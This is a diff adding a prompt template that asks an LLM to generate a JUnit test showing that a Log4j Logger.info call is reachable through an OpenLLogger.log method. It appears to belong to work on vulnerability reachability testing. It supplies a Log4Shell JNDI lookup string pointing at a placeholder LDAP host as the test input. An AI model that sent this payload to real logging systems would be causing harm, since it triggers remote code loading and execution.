@@ -1,0 +1,28 @@
+I want you to generate a unit test, using the JUnit testing framework, 
+This test is used to verify that the vulnerability was successfully triggered,
+You can't have non-existent method calls in the results you give,
+Just generate a single test method,
+For fuzzy parameters, give specific commonly used types, such as Object,String and so on,
+Only the function under test statement is wrapped by a try catch statement(Excluding assert statement), the Exception class uses an exception, and does nothing after the catch,
+The code corresponds to the function being tested, with context information, for example: 
+
+The source code of the function under test is (The unit test should test this function):
+protected final void log ( String text , String arg1 , String arg2 ) { logger . info ( text , arg1 , arg2 ) ; } 
+
+and the class name of the function under test is:
+OpenLLogger
+
+The vulnerable third-party library function and the class to which the function belongs are:
+class name:Logger
+method name:info
+
+The input variable name for this unit test is "input", and the value of this "input" is:
+${jndi:ldap://0.0.0.0:1389/Log4jRCE}
+
+After declaring test input data, you need to call the following statement:
+MethodCallInterceptor.interceptor(
+org.apache.logging.log4j.Logger.class,"info", new Object[]{input}
+);
+
+The assert statement to verify that the vulnerability was successfully triggered is fixed as:
+assertTrue(MethodCallInterceptor.isTrigger);
